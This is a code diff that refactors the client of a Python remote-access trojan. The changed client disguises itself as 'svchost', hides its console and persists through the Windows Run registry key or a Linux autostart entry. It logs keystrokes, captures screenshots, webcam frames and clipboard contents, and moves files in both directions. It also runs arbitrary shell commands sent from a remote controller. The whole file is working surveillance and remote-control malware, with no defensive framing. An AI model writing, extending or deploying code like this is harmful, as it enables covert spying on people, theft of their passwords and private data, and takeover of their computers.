@@ -4,218 +4,358 @@ import socket
 import subprocess
 import sys
 import platform
-import struct
 import io
-import protocolo
+import json
+import base64
+import threading
+import time
+import random
+import string
 from datetime import datetime
 from time import sleep
-from pynput import keyboard
-from PIL import ImageGrab
 
-IS_WINDOWS = os.name == "nt"
+IS_WINDOWS = platform.system() == "Windows"
+
 if IS_WINDOWS:
-    import winreg
+    try:
+        import winreg
+        import ctypes
+        from ctypes import wintypes
+    except:
+        pass
+
+try:
+    from PIL import ImageGrab
+    PIL_AVAILABLE = True
+except:
+    PIL_AVAILABLE = False
+
+try:
+    import pynput
+    from pynput import keyboard
+    PYNPUT_AVAILABLE = True
+except:
+    PYNPUT_AVAILABLE = False
+
+import protocol
+import crypto
 
 IP = "127.0.0.1"
 PORT = 443
-PROGRAM_NAME = "OneDrive"
-REGISTRY_KEY_PATH = r"Software\Microsoft\Windows\CurrentVersion\Run"
-AUTOSTART_DIR = os.path.expanduser("~/.config/autostart")
-DESKTOP_FILE_PATH = os.path.join(AUTOSTART_DIR, f"{PROGRAM_NAME}.desktop")
-MAX_BUFFER_SIZE = 300
+PROGRAM_NAME = "svchost"
+MAX_BUFFER_SIZE = 500
+RECONNECT_DELAY = 5
+MAX_RECONNECT_DELAY = 300
 
-keylog_buffer = []
-buffer_auto_send_pending = False
-keylogger_active = False
-listener = None
-
-def format_key(key):
-    try:
-        return key.char
-    except AttributeError:
-        special_key = {
-            keyboard.Key.space: " ",
-            keyboard.Key.enter: "[ENTER]\n",
-            keyboard.Key.tab: "[TAB]\n",
-            keyboard.Key.backspace: "[BACKSPACE]\n",
-            keyboard.Key.shift: "",
-            keyboard.Key.shift_r: "",
-            keyboard.Key.ctrl: "",
-            keyboard.Key.ctrl_r: "",
-            keyboard.Key.alt: "",
-            keyboard.Key.alt_r: "",
-        }
-        return special_key.get(key, f"[{str(key).replace('Key.', '').upper()}]")
-
-def on_press(key):
-    global keylog_buffer, buffer_auto_send_pending
-    formatted = format_key(key)  
-    if formatted:  
-        keylog_buffer.append(formatted)  
-    if len(keylog_buffer) >= MAX_BUFFER_SIZE:  
-        buffer_auto_send_pending = True
-
-def get_keylog_data():
-    global keylog_buffer
-    if not keylog_buffer:  
-        return ""  
-    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")  
-    data = f"[+] Keylog captured at {timestamp}:\n{''.join(keylog_buffer)}\n"
-    keylog_buffer = []  
-    return data
-
-def start_keylogger():
-    global keylogger_active, listener
-    if keylogger_active:  
-        return "[i] Keylogger is already active\n"  
-    try:
-        listener = keyboard.Listener(on_press=on_press)  
-        listener.start()  
-        keylogger_active = True  
-        return "[+] Keylogger started\n"
-    except Exception as e:
-        return f"[-] Error starting listener: {type(e).__name__} -> {e}\n"
-
-def stop_keylogger():
-    global keylogger_active, listener
-    if not keylogger_active:  
-        return "[i] Keylogger not running.\n"  
-    if listener is not None:  
-        listener.stop()  
-        listener = None  
-    keylogger_active = False  
-    return "[+] Keylogger stopped.\n"
-
-def capture_screenshot():
-    try:
-        screenshot = ImageGrab.grab()
-        img_byte_arr = io.BytesIO()
-        screenshot.save(img_byte_arr, format='PNG')
-        return img_byte_arr.getvalue()
-    except Exception as e:
-        return f"[-] Screenshot error: {type(e).__name__} -> {e}".encode("utf-8")
-
-def copy_system_file():
-    try:
-        current_file = os.path.abspath(sys.argv)
+class Disguise:
+    @staticmethod
+    def set_console_title(title=""):
         if IS_WINDOWS:
-            appdata_path = os.path.join(os.getenv("APPDATA"), "Microsoft", "Windows")
-            if not os.path.exists(appdata_path):
-                os.makedirs(appdata_path)
-            ext = ".exe" if current_file.endswith(".exe") else ".py"
-            destination = os.path.join(appdata_path, f"{PROGRAM_NAME}{ext}")  
-        else:
-            target_dir = os.path.expanduser("~/.local/share")
-            if not os.path.exists(target_dir):
-                os.makedirs(target_dir)
-            destination = os.path.join(target_dir, f"{PROGRAM_NAME}.py")  
-
-        if os.path.abspath(current_file) != os.path.abspath(destination):  
-            shutil.copy2(current_file, destination)  
-            return destination  
-        return current_file  
-    except OSError as e:
-        print(f"[-] Disk operations error: {e}")
-        return os.path.abspath(sys.argv)
-
-def check_persistence():
-    try:
+            ctypes.windll.kernel32.SetConsoleTitleW(title)
+    
+    @staticmethod
+    def hide_console():
         if IS_WINDOWS:
-            key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, REGISTRY_KEY_PATH, 0, winreg.KEY_READ)
-            winreg.QueryValueEx(key, PROGRAM_NAME)  
-            winreg.CloseKey(key)  
-            return True  
-        else:
-            return os.path.exists(DESKTOP_FILE_PATH)
-    except (FileNotFoundError, OSError):  
-        return False
+            ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
+    
+    @staticmethod
+    def random_filename():
+        return ''.join(random.choices(string.ascii_lowercase, k=8)) + '.exe'
 
-def setup_persistence():
-    try:
-        if check_persistence():
-            return
-        persistence_path = copy_system_file()  
-        
-        if IS_WINDOWS:
-            key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, REGISTRY_KEY_PATH, 0, winreg.KEY_SET_VALUE)
-            exec_command = f'"{sys.executable}" "{persistence_path}"' if persistence_path.endswith(".py") else f'"{persistence_path}"'
-            winreg.SetValueEx(key, PROGRAM_NAME, 0, winreg.REG_SZ, exec_command)  
-            winreg.CloseKey(key)  
-        else:
-            if not os.path.exists(AUTOSTART_DIR):
-                os.makedirs(AUTOSTART_DIR)
-            desktop_entry = f"[Desktop Entry]\nType=Application\nExec={sys.executable} \"{persistence_path}\"\nHidden=false\nNoDisplay=false\nX-GNOME-Autostart-enabled=true\nName={PROGRAM_NAME}\n"
-            with open(DESKTOP_FILE_PATH, "w") as f:
-                f.write(desktop_entry)
-    except (OSError, PermissionError) as e:  
-        print(f"[-] Persistence failure: {e}")
-
-def connect(ip, port):
-    try:
-        c = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        c.connect((ip, port))
-        protocolo.enviar_mensagem(c, "[#] Client connected\n")
-        return c
-    except OSError as e:
-        print(f"[-] Connection failed to {ip}:{port}: {e}")
-        return None
-
-def listen(c):
-    global buffer_auto_send_pending
-    c.settimeout(1.0)
-    while True:
+class Keylogger:
+    def __init__(self):
+        self.buffer = []
+        self.active = False
+        self.listener = None
+        self.lock = threading.Lock()
+    
+    def format_key(self, key):
         try:
-            if buffer_auto_send_pending:
-                data = get_keylog_data()
-                if data:
-                    protocolo.enviar_mensagem(c, data)
-                buffer_auto_send_pending = False
+            return key.char
+        except AttributeError:
+            mapping = {
+                keyboard.Key.space: " ",
+                keyboard.Key.enter: "\n",
+                keyboard.Key.tab: "\t",
+                keyboard.Key.backspace: "[BKSP]",
+                keyboard.Key.shift: "",
+                keyboard.Key.shift_r: "",
+                keyboard.Key.ctrl: "",
+                keyboard.Key.ctrl_r: "",
+                keyboard.Key.alt: "",
+                keyboard.Key.alt_r: "",
+                keyboard.Key.caps_lock: "[CAPS]",
+                keyboard.Key.esc: "[ESC]",
+                keyboard.Key.delete: "[DEL]",
+                keyboard.Key.insert: "[INS]",
+                keyboard.Key.home: "[HOME]",
+                keyboard.Key.end: "[END]",
+                keyboard.Key.page_up: "[PGUP]",
+                keyboard.Key.page_down: "[PGDN]",
+                keyboard.Key.up: "[UP]",
+                keyboard.Key.down: "[DOWN]",
+                keyboard.Key.left: "[LEFT]",
+                keyboard.Key.right: "[RIGHT]",
+            }
+            name = str(key).replace('Key.', '').upper()
+            return mapping.get(key, f"[{name}]")
+    
+    def on_press(self, key):
+        with self.lock:
+            formatted = self.format_key(key)
+            if formatted:
+                self.buffer.append(formatted)
+    
+    def start(self):
+        if self.active or not PYNPUT_AVAILABLE:
+            return "[-] Keylogger unavailable"
+        try:
+            self.listener = keyboard.Listener(on_press=self.on_press)
+            self.listener.start()
+            self.active = True
+            return "[+] Keylogger started"
+        except Exception as e:
+            return f"[-] Keylogger error: {e}"
+    
+    def stop(self):
+        if not self.active:
+            return "[-] Keylogger not running"
+        if self.listener:
+            self.listener.stop()
+            self.listener = None
+        self.active = False
+        return "[+] Keylogger stopped"
+    
+    def dump(self):
+        with self.lock:
+            if not self.buffer:
+                return "[-] Buffer empty"
+            timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+            data = f"[KEYLOG {timestamp}]\n{''.join(self.buffer)}\n"
+            self.buffer = []
+            return data
 
+class SystemInfo:
+    @staticmethod
+    def collect():
+        info = {
+            'platform': platform.platform(),
+            'processor': platform.processor(),
+            'hostname': platform.node(),
+            'username': os.getenv('USERNAME') or os.getenv('USER'),
+            'python': platform.python_version(),
+            'architecture': platform.architecture()[0],
+        }
+        if IS_WINDOWS:
+            info['windows_version'] = platform.version()
+        return json.dumps(info, indent=2)
+
+class Clipboard:
+    @staticmethod
+    def get():
+        try:
+            if IS_WINDOWS:
+                import win32clipboard
+                win32clipboard.OpenClipboard()
+                data = win32clipboard.GetClipboardData()
+                win32clipboard.CloseClipboard()
+                return f"[CLIPBOARD]\n{data}\n"
+            else:
+                return "[-] Clipboard only on Windows"
+        except:
+            return "[-] Clipboard access failed"
+
+class Webcam:
+    @staticmethod
+    def capture():
+        try:
+            import cv2
+            cap = cv2.VideoCapture(0)
+            ret, frame = cap.read()
+            cap.release()
+            if ret:
+                _, img_encoded = cv2.imencode('.png', frame)
+                return img_encoded.tobytes()
+            return None
+        except:
+            return None
+
+class FileManager:
+    @staticmethod
+    def download(filepath):
+        try:
+            with open(filepath, 'rb') as f:
+                return f.read()
+        except:
+            return None
+    
+    @staticmethod
+    def upload(filepath, content):
+        try:
+            with open(filepath, 'wb') as f:
+                f.write(content)
+            return True
+        except:
+            return False
+
+class Persistence:
+    @staticmethod
+    def install():
+        try:
+            current = os.path.abspath(sys.argv[0])
+            if IS_WINDOWS:
+                appdata = os.path.join(os.getenv('APPDATA', ''), 'Microsoft', 'Windows')
+                os.makedirs(appdata, exist_ok=True)
+                dest = os.path.join(appdata, f"{PROGRAM_NAME}.py")
+                if current != dest:
+                    shutil.copy2(current, dest)
+                
+                key = winreg.OpenKey(winreg.HKEY_CURRENT_USER,
+                                   r"Software\Microsoft\Windows\CurrentVersion\Run",
+                                   0, winreg.KEY_SET_VALUE)
+                winreg.SetValueEx(key, PROGRAM_NAME, 0, winreg.REG_SZ,
+                                f'"{sys.executable}" "{dest}"')
+                winreg.CloseKey(key)
+            else:
+                target = os.path.expanduser("~/.local/share")
+                os.makedirs(target, exist_ok=True)
+                dest = os.path.join(target, f"{PROGRAM_NAME}.py")
+                if current != dest:
+                    shutil.copy2(current, dest)
+                
+                autostart = os.path.expanduser("~/.config/autostart")
+                os.makedirs(autostart, exist_ok=True)
+                desktop = os.path.join(autostart, f"{PROGRAM_NAME}.desktop")
+                entry = f"[Desktop Entry]\nType=Application\nExec={sys.executable} \"{dest}\"\nHidden=false\nName={PROGRAM_NAME}\n"
+                with open(desktop, "w") as f:
+                    f.write(entry)
+        except:
+            pass
+
+class Client:
+    def __init__(self):
+        self.keylogger = Keylogger()
+        self.crypto = crypto.SecureChannel()
+        self.protocol = protocol.ProtocolHandler(self.crypto)
+        self.running = True
+        self.reconnect_delay = RECONNECT_DELAY
+        
+    def connect(self):
+        try:
+            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            sock.settimeout(10)
+            sock.connect((IP, PORT))
+            
+            key = os.urandom(32)
+            self.crypto.set_key(key)
+            sock.send(base64.b64encode(key))
+            
+            sock.settimeout(None)
+            self.protocol.send(sock, "[+] Client connected")
+            return sock
+        except:
+            return None
+    
+    def screenshot(self):
+        if not PIL_AVAILABLE:
+            return "[-] PIL unavailable"
+        try:
+            img = ImageGrab.grab()
+            buffer = io.BytesIO()
+            img.save(buffer, format='PNG')
+            return buffer.getvalue()
+        except:
+            return None
+    
+    def execute_shell(self, cmd):
+        try:
+            proc = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE,
+                                stderr=subprocess.PIPE, stdin=subprocess.DEVNULL)
+            out, err = proc.communicate(timeout=60)
+            result = out + err
+            return result if result else b"[+] Executed"
+        except subprocess.TimeoutExpired:
+            proc.kill()
+            return b"[-] Timeout"
+        except:
+            return b"[-] Execution failed"
+    
+    def handle_command(self, sock, cmd):
+        if cmd == '/exit':
+            return False
+        elif cmd == '/screenshot':
+            data = self.screenshot()
+            if isinstance(data, bytes):
+                self.protocol.send(sock, b'[SCREENSHOT]' + data)
+            else:
+                self.protocol.send(sock, str(data))
+        elif cmd == '/keylog_start':
+            self.protocol.send(sock, self.keylogger.start())
+        elif cmd == '/keylog_stop':
+            self.protocol.send(sock, self.keylogger.stop())
+        elif cmd == '/keylog_dump':
+            self.protocol.send(sock, self.keylogger.dump())
+        elif cmd == '/clipboard':
+            self.protocol.send(sock, Clipboard.get())
+        elif cmd == '/webcam':
+            data = Webcam.capture()
+            if data:
+                self.protocol.send(sock, b'[WEBCAM]' + data)
+            else:
+                self.protocol.send(sock, "[-] Webcam failed")
+        elif cmd == '/info':
+            self.protocol.send(sock, SystemInfo.collect())
+        elif cmd == '/ping':
+            self.protocol.send(sock, "[+] PONG")
+        elif cmd.startswith('/download '):
+            filepath = cmd[10:].strip()
+            data = FileManager.download(filepath)
+            if data:
+                self.protocol.send(sock, b'[FILE]' + filepath.encode() + b'|' + data)
+            else:
+                self.protocol.send(sock, "[-] Download failed")
+        elif cmd.startswith('[UPLOAD]'):
             try:
-                payload = protocolo.receber_mensagem(c)
+                parts = cmd[8:].split('|', 1)
+                if len(parts) == 2:
+                    filename, content = parts[0], parts[1].encode('latin-1')
+                    FileManager.upload(filename, content)
+                    self.protocol.send(sock, f"[+] Uploaded: {filename}")
+            except:
+                self.protocol.send(sock, "[-] Upload failed")
+        else:
+            result = self.execute_shell(cmd)
+            self.protocol.send(sock, result)
+        return True
+    
+    def listen(self, sock):
+        while self.running:
+            try:
+                payload = self.protocol.receive(sock)
                 if payload is None:
                     break
-                command = payload.decode("utf-8").strip()
-                if not command:
-                    continue
-            except socket.timeout:
-                continue
-
-            if command == "/exit":
+                cmd = payload.decode('utf-8', errors='replace').strip()
+                if not self.handle_command(sock, cmd):
+                    break
+            except:
                 break
-            elif command == "/screenshot":
-                img_data = capture_screenshot()
-                protocolo.enviar_mensagem(c, img_data)
-            elif command == "/keylog_start":
-                res = start_keylogger()
-                protocolo.enviar_mensagem(c, res)
-            elif command == "/keylog_dump":
-                res = get_keylog_data()
-                if not res:
-                    res = "[i] Keylog buffer empty\n"
-                protocolo.enviar_mensagem(c, res)
-            elif command == "/keylog_stop":
-                res = stop_keylogger()
-                protocolo.enviar_mensagem(c, res)
-            else:
-                proc = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
-                stdout, stderr = proc.communicate()
-                output = stdout + stderr
-                if not output:
-                    output = b"[+] Command executed (No output)\n"
-                protocolo.enviar_mensagem(c, output)
-        except (RuntimeError, OSError) as e_err:
-            print(f"[-] Connection or state error: {e_err}")
-            break
-
-def main():
-    setup_persistence()
-    while True:
-        c = connect(IP, PORT)
-        if c:
-            listen(c)
-            c.close()
-        sleep(5)
+    
+    def run(self):
+        Disguise.hide_console()
+        Persistence.install()
+        
+        while True:
+            sock = self.connect()
+            if sock:
+                self.reconnect_delay = RECONNECT_DELAY
+                self.listen(sock)
+                try:
+                    sock.close()
+                except:
+                    pass
+            sleep(self.reconnect_delay)
+            self.reconnect_delay = min(self.reconnect_delay * 2, MAX_RECONNECT_DELAY)
 
 if __name__ == "__main__":
-    main()
+    client = Client()
+    client.run()
